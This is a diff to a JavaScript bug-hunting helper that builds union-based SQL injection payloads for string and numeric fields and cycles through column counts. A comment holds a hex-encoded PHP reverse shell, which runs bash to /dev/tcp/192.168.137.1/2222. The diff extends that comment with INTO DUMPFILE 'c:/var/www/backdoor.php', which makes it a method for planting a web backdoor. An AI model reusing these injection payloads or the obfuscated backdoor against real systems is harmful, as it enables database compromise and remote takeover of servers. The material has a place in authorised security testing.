@@ -45,17 +45,19 @@ function JsBugHuntingHelper () {
   const eof = ['', '--', '#']
 
   const sqliQuery = []
-  sqliQuery[0] = { originalQuery: "' union select '918273645", addend: ",'918273645", finalQuote: ['', "'"] }
-  sqliQuery[1] = { originalQuery: '" union select "918273645', addend: ',"918273645', finalQuote: ['', '"'] }
-  sqliQuery[2] = { originalQuery: "' union select 918273645", addend: ',918273645', finalQuote: [''] }
-  sqliQuery[3] = { originalQuery: '0 union select 918273645', addend: ',918273645', finalQuote: [''] }
+  // string field with '
+  sqliQuery[0] = { originalQuery: "' union select '918273645", addend: "','918273645", finalQuote: ['', "'"] }
+  // string field with "
+  sqliQuery[1] = { originalQuery: '" union select "918273645', addend: '","918273645', finalQuote: ['', '"'] }
+  // number field
+  sqliQuery[2] = { originalQuery: '0 union select 918273645', addend: ',918273645', finalQuote: [''] }
 
   for (let q = 0; q < sqliQuery.length; q++) {
     // console.log('q', q)
     let payload = sqliQuery[q].originalQuery
 
-    // addend cycle (20 loops- double of other famous sql mapper)
-    for (let i = 0; i < 20; i++) {
+    // addend cycle (11 loops- 1 more than other famous sql mapper)
+    for (let i = 0; i < 11; i++) {
       // console.log('i', i)
       if (i > 0) {
         payload += sqliQuery[q].addend
@@ -81,7 +83,7 @@ function JsBugHuntingHelper () {
 
       // method to create shell from mysql
       // win
-      // 0x3c3f706870206578656328222f62696e2f62617368202d63202762617368202d69203e26202f6465762f7463702f3139322e3136382e3133372e312f3232323220303e26312722293b3f3e
+      // 0x3c3f706870206578656328222f62696e2f62617368202d63202762617368202d69203e26202f6465762f7463702f3139322e3136382e3133372e312f3232323220303e26312722293b3f3e  INTO DUMPFILE 'c:/var/www/backdoor.php'
 
       for (let fq = 0; fq < sqliQuery[q].finalQuote.length; fq++) {
         const payloadWithQuotes = payload + sqliQuery[q].finalQuote[fq]
